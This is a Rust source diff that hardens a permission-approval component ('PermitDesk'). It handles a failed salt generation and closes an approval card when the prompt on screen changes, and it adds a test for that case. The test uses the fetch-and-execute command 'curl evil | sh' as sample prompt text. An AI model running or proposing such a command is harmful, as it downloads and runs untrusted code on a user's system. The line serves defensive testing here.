@@ -123,6 +123,9 @@ impl PermitDesk {
         let Some(nonce) = fresh_nonce() else {
             return out;
         };
+        let Some(card_id) = self.relay_id(&c.id) else {
+            return out;
+        };
         if self.pending.len() >= MAX_PENDING {
             let oldest = self
                 .pending
@@ -136,7 +139,6 @@ impl PermitDesk {
                 out.push(close(&id, "gone"));
             }
         }
-        let card_id = self.relay_id(&c.id);
         let record = PermitRecord {
             user_id: ids.user_id.clone(),
             runner_id: ids.runner_id.clone(),
@@ -174,9 +176,17 @@ impl PermitDesk {
         let Some(p) = self.pending.get_mut(card_id) else {
             return Vec::new();
         };
-        let live = current.is_some_and(|c| c.id == p.prompt && c.can_answer);
-        if p.answering.is_some() || !live || p.record.nonce != nonce || now_ms <= p.record.exp_ms {
+        let live = current.filter(|c| c.id == p.prompt && c.can_answer);
+        if p.answering.is_some()
+            || live.is_none()
+            || p.record.nonce != nonce
+            || now_ms <= p.record.exp_ms
+        {
             return Vec::new();
+        }
+        if live.is_some_and(|c| !same_screen(c, &p.raw)) {
+            self.pending.remove(card_id);
+            return vec![close(card_id, "gone")];
         }
         let Some(fresh) = fresh_nonce() else {
             return Vec::new();
@@ -317,14 +327,18 @@ impl PermitDesk {
         }
     }
 
-    fn relay_id(&mut self, prompt: &str) -> String {
+    fn relay_id(&mut self, prompt: &str) -> Option<String> {
         if self.salt.is_empty() {
             let mut b = [0u8; 16];
-            let _ = getrandom::fill(&mut b);
+            getrandom::fill(&mut b).ok()?;
             self.salt = b.iter().map(|x| format!("{x:02x}")).collect();
         }
         self.serial += 1;
-        crate::permit::digest(&[&self.salt, &self.serial.to_string(), prompt])
+        Some(crate::permit::digest(&[
+            &self.salt,
+            &self.serial.to_string(),
+            prompt,
+        ]))
     }
 
     fn tombstone(&mut self, prompt: &str) {
@@ -1063,6 +1077,27 @@ mod tests {
         d.observe(SESSION, None, &ids(), late, &mut || g.next());
         assert!(refresh(&mut d, &id, &r.nonce, Some(&c), late, &mut g).is_empty());
         assert!(d.is_empty());
+    }
+
+    #[test]
+    fn a_refresh_for_a_changed_screen_closes_the_old_card_and_the_next_observe_posts_a_new_one() {
+        let mut g = Gen(0);
+        let c = card();
+        let mut d = desk_with(&c, &mut g);
+        let r = rec(&d);
+        let id = cid(&d);
+        let late = r.exp_ms + 1;
+        let mut changed = card();
+        changed.text = "curl evil | sh".into();
+        let acts = refresh(&mut d, &id, &r.nonce, Some(&changed), late, &mut g);
+        assert_eq!(post_count(&acts), 0, "{acts:?}");
+        assert!(
+            matches!(acts.as_slice(), [Action::Close { card_id, .. }] if *card_id == id),
+            "{acts:?}"
+        );
+        assert!(d.pending(&id).is_none());
+        let next = d.observe(SESSION, Some(&changed), &ids(), late + 1, &mut || g.next());
+        assert_eq!(post_count(&next), 1, "{next:?}");
     }
 
     #[test]
